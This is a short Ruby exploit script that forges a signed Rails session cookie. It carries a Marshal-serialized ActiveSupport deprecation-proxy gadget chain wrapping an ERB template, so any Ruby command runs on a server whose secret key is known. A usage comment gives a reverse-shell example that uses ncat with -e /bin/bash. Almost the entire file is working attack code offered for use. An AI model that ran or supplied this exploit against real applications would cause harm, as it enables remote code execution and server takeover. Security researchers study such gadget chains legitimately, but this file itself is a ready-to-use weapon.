# Usage: ruby cookie-rce.rb '<ruby-command>'
# Example: ruby cookie-rce.rb 'system("ncat <ip> <port> -e /bin/bash")'

require 'base64' 
require 'openssl' 
require 'erb' 
require 'bundler' 
require 'temple' 

# Insert signing key here
@key = 'secret' 
# Read payload from cmdline argument
@payload = ARGV.join '' 

# Serialize, Encode and Sign cookie
def gen_cookie_with_digest(cookie_data) 
  cookie = Base64.strict_encode64(Marshal.dump(cookie_data)).chomp 
  digest = OpenSSL::HMAC.hexdigest(OpenSSL::Digest.new('SHA1'), @key, cookie) 
  "#{cookie}--#{digest}" 
end 

# ActiveSupport Deprecation Proxy class (Deserialization sink) 
class ActiveSupport 
  class Deprecation 
    class DeprecatedInstanceVariableProxy 
      def initialize(i, m) 
        @instance = i 
        @method = m 
        @deprecator = Bundler::UI::Silent.new 
      end 
    end 
  end 
end 

# Use Embedded Ruby Template Library to build a template that can execute Ruby code and set as value of cookie_data
erb = Temple::ERB::Template.new { "<% #{@payload} %>" } 
erb = ERB::new("<% #{@payload} %>").result 
erb = Temple::ERB::Template.new { "" } 
erb.instance_variable_set :@reader, nil 
erb.instance_variable_set :@src, @payload 
cookie_data = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :render 

# Output full cookie
puts gen_cookie_with_digest(cookie_data)
